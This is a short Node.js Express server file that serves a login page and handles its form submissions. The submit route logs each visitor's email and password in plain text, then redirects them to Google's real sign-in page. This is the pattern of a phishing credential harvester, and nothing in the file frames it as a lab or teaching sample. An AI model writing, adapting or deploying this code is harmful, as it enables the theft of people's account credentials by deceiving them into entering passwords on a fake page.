const express = require("express");
const bodyParser = require('body-parser');
const app = express();
const router = express.Router();
const path = __dirname + "/views/";
const port = 3000;
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path));
app.use('/css', express.static(__dirname + '/views/css'));
app.use('/js', express.static(__dirname + '/views/js'));
router.use(function (req, res, next) {
  console.log("/" + req.method);
  next();
});
app.use("/", router);
app.listen(port, function () {
  console.log(`Example app listening on port ${port}!`);
});
router.post('/submit-your-login-form', (req, res) => {
  const email = req.body.email;
  const password = req.body.password;
  console.log(`Email: ${email}`);
  console.log(`Password: ${password}`);
  // res.send('登录表单已提交');
  res.redirect('https://accounts.google.com/Login');
});
router.get("/", function (req, res) {
  res.sendFile(path + "index.html");
});